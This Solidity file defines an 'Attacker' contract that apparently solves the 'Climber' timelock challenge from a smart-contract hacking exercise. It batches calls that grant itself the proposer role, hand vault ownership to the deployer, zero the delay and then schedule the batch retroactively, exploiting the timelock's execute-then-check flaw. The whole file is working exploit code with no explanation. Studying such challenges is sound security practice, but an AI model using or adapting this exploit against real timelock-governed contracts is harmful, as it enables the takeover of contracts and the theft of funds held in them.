// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./ClimberTimelock.sol";

contract Attacker {
    ClimberTimelock private immutable timelock;

    uint256[] values = [0, 0, 0, 0];
    address[] targets = new address[](4);
    bytes[] elements = new bytes[](4);

    constructor(address payable _timelock, address _vault) {
        timelock = ClimberTimelock(_timelock);
        targets = [_timelock, _vault, _timelock, address(this)];

        elements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );
        elements[1] = abi.encodeWithSignature(
            "transferOwnership(address)",
            msg.sender
        );
        elements[2] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        elements[3] = abi.encodeWithSignature("schedule()");
    }

    function attack() external {
        timelock.execute(targets, values, elements, bytes32("SALTY"));
    }

    function schedule() external {
        timelock.schedule(targets, values, elements, bytes32("SALTY"));
    }
}
